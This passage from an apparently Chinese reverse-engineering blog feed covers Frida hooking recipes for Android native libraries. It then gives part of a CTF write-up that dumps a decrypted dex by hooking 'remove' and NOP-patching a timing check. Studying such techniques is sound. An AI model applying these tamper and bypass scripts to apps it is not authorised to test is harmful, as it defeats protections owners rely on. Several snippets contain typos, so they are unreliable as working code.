language_">console</span>.<span class="hljs-title function_">log</span>(originalStrPtr);<br>                    <span class="hljs-keyword">var</span> modifiedContent = <span class="hljs-string">&quot;str1&quot;</span>;<br>                    <span class="hljs-keyword">var</span> newJSring = <span class="hljs-title class_">JNIEnv</span>.<span class="hljs-title function_">newSringUtf</span>(modifiedContent);<br>                    args[<span class="hljs-number">1</span>] = newJString;<br><br>                &#125;,<br>                <span class="hljs-comment">//onLeave 里打印和修改返回值</span><br>                <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) &#123; <span class="hljs-comment">//retval 为返回值</span><br>                    <span class="hljs-comment">//方法1：</span><br>                    <span class="hljs-keyword">var</span> jString = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">cast</span>(retval.<span class="hljs-property">Jave</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;Java.lang.String&quot;</span>));<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;retval:&quot;</span>, jString.<span class="hljs-title function_">toString</span>());<br>                    <span class="hljs-comment">//方法2：</span><br>                    <span class="hljs-keyword">var</span> <span class="hljs-title class_">JNIEnv</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-property">vm</span>.<span class="hljs-title function_">getEnv</span>();<br>                    <span class="hljs-keyword">var</span> originalStrPtr = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">getStringUtfChars</span>(retval, <span class="hljs-literal">null</span>).<span class="hljs-title function_">readCString</span>();<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(originalStrPtr);<br>                    <span class="hljs-keyword">var</span> modifiedContent = <span class="hljs-string">&quot;str1&quot;</span>;<br>                    <span class="hljs-keyword">var</span> newJSring = <span class="hljs-title class_">JNIEnv</span>.<span class="hljs-title function_">newSringUtf</span>(modifiedContent);<br>                    retval.<span class="hljs-title function_">replace</span>(newJString);<br><br><br>                &#125;<br><br>            &#125;)<br>        &#125;<br><br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><ol start="5"><li>枚举导入导出表</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//枚举导入导出表</span><br><span class="hljs-comment">//导入表(Import Table）：列出了库需要从其他库中调用的函数和符号名称 --需要的</span><br><span class="hljs-comment">//导出表(Export Table）：列出了库中可以被其他程序或库访问的所有公开函数和符号的名称  --提供的</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest1</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-comment">//打印导入表</span><br>        <span class="hljs-keyword">var</span> imports = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">enumerateImports</span>(<span class="hljs-string">&quot;libxxx.so&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; imports.<span class="hljs-property">length</span>; i++) &#123;<br>            <span class="hljs-keyword">if</span> (imports[i].<span class="hljs-property">name</span> == <span class="hljs-string">&quot;some_name&quot;</span>) &#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(imports[i]));<br>                <span class="hljs-comment">//通过 JSON.stringify() 打印 object 数据</span><br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(imports[i].<span class="hljs-property">address</span>);<br><br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//打印导出表</span><br>        <span class="hljs-keyword">var</span> <span class="hljs-built_in">exports</span> = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">ennumerateExports</span>(<span class="hljs-string">&quot;libxxx.so&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">exports</span>.<span class="hljs-property">length</span>; i++) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-built_in">exports</span>[i]));<br>        &#125;<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><ol start="6"><li>获取 so 基地址</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//获取 so 基地址的方式</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">get_to_so_addr</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> moduleAddr1 = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(<span class="hljs-string">&quot;libxxx.so&quot;</span>).<span class="hljs-property">base</span>;<br>        <span class="hljs-keyword">var</span> moduleAddr2 = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">getModuleByName</span>(<span class="hljs-string">&quot;libxxx.so&quot;</span>).<span class="hljs-property">base</span>;<br>        <span class="hljs-keyword">var</span> moduleAddr3 = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;libxxx.so&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(moduleAddr1);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(moduleAddr2);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(moduleAddr3);<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><ol start="7"><li>hook 未导出函数 函数基地址计算</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//hook 未导出函数与函数基地址的计算</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookTest5</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-comment">//根据导出函数名打印及地址</span><br>        <span class="hljs-keyword">var</span> soAddr= <span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;libxxx.so&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(aoAddr);<br>        <span class="hljs-keyword">var</span> funcAddr=soAddr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x1234</span>);<span class="hljs-comment">//函数基地址+偏移地址</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(funcAddr);<br>        <span class="hljs-keyword">if</span>(funcAddr!=<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(funcAddr,&#123;<br>                <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;<br><br>                &#125;,<br>                <span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)&#123;<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(retval.<span class="hljs-title function_">toInt2</span>());<br><br>                &#125;<br>            &#125;)<br>        &#125;<br>    &#125;)<br>&#125;<br><br><span class="hljs-comment">//函数的地址计算</span><br><span class="hljs-comment">//安卓里面一般 32 位的 so 中用的是 thumb 指令，64 位的 so 中用的是 arm 指令</span><br><span class="hljs-comment">//ida 中 opcode bytes 判断，arm 指令为四个字节(options-&gt;general-&gt;Number of opcode bytes(non-graph)输入4)</span><br><span class="hljs-comment">//thumb 指令的函数指令计算方式：so 基地址+函数在 so 中的偏移 +1</span><br><span class="hljs-comment">//arm 指令的函数指令计算方式：so 基地址+函数在 so 中的偏移</span><br></code></pre></td></tr></table></figure><ol start="8"><li>hook dlopen</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//hook dlopen</span><br><span class="hljs-comment">//android_dlopen_ext()、dlopen()、do_dlopen()主要用于加载库文件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook_dlopen</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> dlopen=<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;dlopen&quot;</span>);<br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(dlopen,&#123;<br>        <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;<br>            <span class="hljs-keyword">var</span> so_name=args[<span class="hljs-number">0</span>].<span class="hljs-title function_">readCString</span>();<br>            <span class="hljs-keyword">if</span> (so_name.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;libxxx.so&quot;</span>)&gt;=<span class="hljs-number">0</span>) <span class="hljs-variable language_">this</span>.<span class="hljs-property">call_hook</span>=<span class="hljs-literal">true</span>;<br>        &#125;,<br>        <span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">this</span>,call_hook) <span class="hljs-title function_">hookTest2</span>();<br>        &#125;<br>    &#125;);<br>    <span class="hljs-comment">//高版本 android 系统使用 android_dlopen_ext</span><br>     <span class="hljs-keyword">var</span> android_dlopen_ext=<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;android_dlopen_ext&quot;</span>);<br>     <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(android_dlopen_ext,&#123;<br>        <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;<br>            <span class="hljs-keyword">var</span> so_name=args[<span class="hljs-number">0</span>].<span class="hljs-title function_">readCString</span>();<br>            <span class="hljs-keyword">if</span>(so_name.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;libxxx.so&quot;</span>)&gt;=<span class="hljs-number">0</span>) <span class="hljs-variable language_">this</span>.<span class="hljs-property">call_hook</span>=<span class="hljs-literal">true</span>;<br>        &#125;,<span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">call_hook</span>) <span class="hljs-title function_">hookTest2</span>();<br>        &#125;<br>     &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><ol start="9"><li>写数据</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//frida 写数据</span><br><span class="hljs-comment">//一般写在 app 的私有目录里，不然会报错(Permission denied)</span><br><span class="hljs-keyword">var</span> file_path=<span class="hljs-string">&quot;data/user/0/&lt;package_name&gt;/xxx.txt&quot;</span>;<br><span class="hljs-keyword">var</span> file_handle= <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(file_path,<span class="hljs-string">&quot;wb&quot;</span>);<br><span class="hljs-keyword">if</span>(file_handle&amp;&amp;file_handle!=<span class="hljs-literal">null</span>)&#123;<br>    file_handle.<span class="hljs-title function_">write</span>(data);<span class="hljs-comment">//写入数据</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;write data success!&quot;</span>);<br>    file_handle.<span class="hljs-title function_">flush</span>();<span class="hljs-comment">//刷新</span><br>    file_handle.<span class="hljs-title function_">close</span>();<span class="hljs-comment">//关闭</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="10"><li>内联 hook</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//inline_hook</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">inline_hook</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> soAddr=<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;libxxx.so&quot;</span>);<br>    <span class="hljs-keyword">if</span>(soAddr)&#123;<br>        <span class="hljs-keyword">var</span> funcAddr=soAddr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x1234</span>);<span class="hljs-comment">//函数基地址+偏移地址</span><br>        <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>            <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(funcAddr,&#123;<br>                <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>);<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>.<span class="hljs-property">x1</span>);<span class="hljs-comment">//打印寄存器的内容</span><br>                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>.<span class="hljs-property">x1</span>=<span class="hljs-title function_">ptr</span>(<span class="hljs-number">1</span>);<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>.<span class="hljs-property">x1</span>);<br><br>                &#125;<br>            &#125;)  <br>        &#125;)<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//将地址的指令解析成汇编</span><br><span class="hljs-keyword">var</span> soAddr=<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;libxxx.so&quot;</span>);<br><span class="hljs-keyword">var</span> codeAddr=<span class="hljs-title class_">Instruction</span>.<span class="hljs-title function_">parse</span>(soAddr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x1234</span>));<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(codeAddr.<span class="hljs-title function_">toString</span>());<br></code></pre></td></tr></table></figure><ol start="11"><li>普通函数与 JNI 函数的主动调用</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//普通函数与 jni 函数的主动调用</span><br><span class="hljs-keyword">var</span> funcAddr=<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;libxxx.so&quot;</span>).<span class="hljs-title function_">add</span>(<span class="hljs-number">0x1234</span>);<br><span class="hljs-comment">//NativeFunction 的第一个参数是地址 第二个参数是返回值类型 第三个[]里面是传入的参数的类型（有几个就填几个）  </span><br><span class="hljs-keyword">var</span> aesAddr= <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(funcAddr,<span class="hljs-string">&#x27;pointer&#x27;</span>,[<span class="hljs-string">&#x27;pointer&#x27;</span>,<span class="hljs-string">&#x27;pointer&#x27;</span>]);<br><span class="hljs-keyword">var</span> encry_test=<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">allocUtf8String</span>(<span class="hljs-string">&quot;cyphertext&quot;</span>);<br><span class="hljs-keyword">var</span> key=<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">allocUtf8String</span>(<span class="hljs-string">&#x27;key&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">aesAddr</span>(encry_test,key).<span class="hljs-title function_">readCString</span>());<br></code></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安卓逆向 刷题笔记(1)</title>
    <link href="/2025/04/11/androidRE/"/>
    <url>/2025/04/11/androidRE/</url>
    
    <content type="html"><![CDATA[<h2 id="攻防世界-Mobile"><a href="#攻防世界-Mobile" class="headerlink" title="攻防世界 Mobile"></a>攻防世界 Mobile</h2><h3 id="ez-dex"><a href="#ez-dex" class="headerlink" title="ez_dex"></a>ez_dex</h3><ol start="0"><li>这道题在网上看了好多 wp 基本都是手撕加密，但这题的 so 层加密挺不好分析的，而用frida-hook可以直接跳过解密，找到已经解密好的 dex 文件。</li><li>用 jadx 打开,在 AndroidManifest.xml 中找到关键信息:<code>android:hasCode=&quot;false&quot;</code>,声明 APK 中不包含 Java&#x2F;Kotlin 字节码(<strong>.dex 文件</strong>),表示所有逻辑都在 Native 层;当<code>android:value=&quot;native&quot;</code>时，系统会默认加载 libnative.so,此类应用的入口是 Native 层的<code>android_main()</code>函数（而非 Java 的 Activity.onCreate()<br><img src="/../images/5/dex1.png"></li><li>提取出 so 文件,用 ida 分析,直接搜索找到<code>android_main()</code>函数，首先注意到经过加密的<code>filename</code>和<code>name</code>,写一个脚本进行字符串解密</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br>filename_dwords=[-<span class="hljs-number">1651995345</span>,-<span class="hljs-number">2003974520</span>,-<span class="hljs-number">1966700387</span>,<br> -<span class="hljs-number">2000190330</span>,-<span class="hljs-number">2071422265</span>,-<span class="hljs-number">947092071</span>, -<span class="hljs-number">1920499569</span>,<br> -<span class="hljs-number">1936879484</span>,-<span class="hljs-number">2138061167</span>,-<span class="hljs-number">962950011</span>, -<span class="hljs-number">1702328950</span>,<br> -<span class="hljs-number">946172774</span>, -<span class="hljs-number">376337267</span>, ]<br><span class="hljs-comment">#13*4=52</span><br>filename_bytes=<span class="hljs-built_in">bytearray</span>()<br><span class="hljs-keyword">for</span> dword <span class="hljs-keyword">in</span> filename_dwords:<br>    filename_bytes.extend(struct.pack(<span class="hljs-string">&#x27;&lt;i&#x27;</span>,dword))<br>    <span class="hljs-comment">#stuck.pack(&#x27;&lt;i&#x27;,dword) 将每个整数打包为小端序的四字节二进制数据</span><br>    <span class="hljs-comment">#extend()将这些字节添加到字节数组中</span><br>filename_bytes.append(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#在字节数组末尾添加一个空字节，作为字符串的终止符</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">53</span>):<br>    filename_bytes[i]^=<span class="hljs-number">0xE9</span><br>filename=filename_bytes.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>].decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>name_dwords=[-<span class="hljs-number">1651995194</span>,-<span class="hljs-number">2003974520</span>,-<span class="hljs-number">1966700387</span>,-<span class="hljs-number">2000190330</span>,<br>-<span class="hljs-number">2071422265</span>,-<span class="hljs-number">947092071</span> ,-<span class="hljs-number">1920499569</span>,-<span class="hljs-number">1936879484</span>,<span class="hljs-number">2138061167</span>,<br>-<span class="hljs-number">962950011</span> ,-<span class="hljs-number">1853059706</span>]<br><span class="hljs-comment">#11*4+1+1=46</span><br>name_bytes=<span class="hljs-built_in">bytearray</span>()<br><span class="hljs-keyword">for</span> dword <span class="hljs-keyword">in</span> name_dwords:<br>    name_bytes.extend(struct.pack(<span class="hljs-string">&#x27;&lt;i&#x27;</span>,dword))<br>v42=-<span class="hljs-number">5690</span><br>name_bytes.extend(struct.pack(<span class="hljs-string">&#x27;&lt;h&#x27;</span>,v42))<br>name_bytes.append(<span class="hljs-number">0</span>)<br>name_bytes[<span class="hljs-number">0</span>]=<span class="hljs-number">0x2f</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">47</span>):<br>    name_bytes[i]^=<span class="hljs-number">0xE9</span><br>name=name_bytes.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>].decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;filename: &quot;</span>,filename)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;name: &quot;</span>,name)<br><br><span class="hljs-comment"># filename:  /data/data/com.a.sample.findmydex/files/classes.dex</span><br><span class="hljs-comment"># name:  /data/data/com.a.sample.findmydex/files/odex/</span><br></code></pre></td></tr></table></figure><ol start="3"><li>解密后发现得到了 dex 文件存放的位置，但是继续往下看，找到关键部分<br><img src="/../images/5/dex3.png"><br>用frida hook直接拿到解密后的 dex 文件</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> lib = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">load</span>(<span class="hljs-string">&quot;libnative.so&quot;</span>);<br><span class="hljs-keyword">var</span> imports = lib.<span class="hljs-title function_">enumerateImports</span>();<br><span class="hljs-keyword">var</span> removePtr;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; imports.<span class="hljs-property">length</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (imports[i].<span class="hljs-property">name</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;remove&quot;</span>) != -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(imports[i].<span class="hljs-property">name</span>, imports[i].<span class="hljs-property">address</span>);<br>        removePtr = imports[i].<span class="hljs-property">address</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(removePtr);<br><br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">replace</span>(removePtr, <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeCallback</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">arg0</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;remove called&quot;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;arg0: &quot;</span> + arg0);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>    , <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>]));<br><br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(removePtr, &#123;<br>    <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;remove called&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;arg0: &quot;</span> + args[<span class="hljs-number">0</span>]);<br>    &#125;,<br>    <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;remove return value: &quot;</span> + retval);<br>    &#125;<br>&#125;)<br><span class="hljs-keyword">var</span> targetAddr = lib.<span class="hljs-property">base</span>.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x2866</span>);<br><span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">protect</span>(targetAddr, <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;rwx&#x27;</span>);<br>targetAddr.<span class="hljs-title function_">writeByteArray</span>([<span class="hljs-number">0x00</span>, <span class="hljs-number">0xBF</span>]);<br><span class="hljs-keyword">var</span> buf = targetAddr.<span class="hljs-title function_">readByteArray</span>(<span class="hljs-number">100</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(buf);<br></code></pre></td></tr></table></figure><p>因为摇晃次数 v10 还直接控制数据解密流程，所以不能像满足的时间条件一样给 nop 掉<br><img src="/../images/5/dex4.png"><br>BGT（Branch if Greater Than） 是关键跳转，决定是否判定超时,NOP 掉 BGT（0x2866）会使程序永远不跳转，从而绕过时间检查<br>4. <img src="/../images/5/dex5.png"><br>有报错但 dex 文件是成功 dump 出来了的<br><img src="/../images/5/dex6.png"><br>但到这里也不能直接拿到因为没有权限，所以可以把它 pull 到普通目录比如 Download 里面后再存到本地，这样就能获取了<br>5. 在原 apk 中添加 dex 文件，加密就已经出来了<br><img src="/../images/5/dex7.png"><br><img src="/../images/5/dex8.png"><br><img src="/../images/5/dex9.png"><br>密钥：I have a male fish and a female fish<br>获取密文：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span 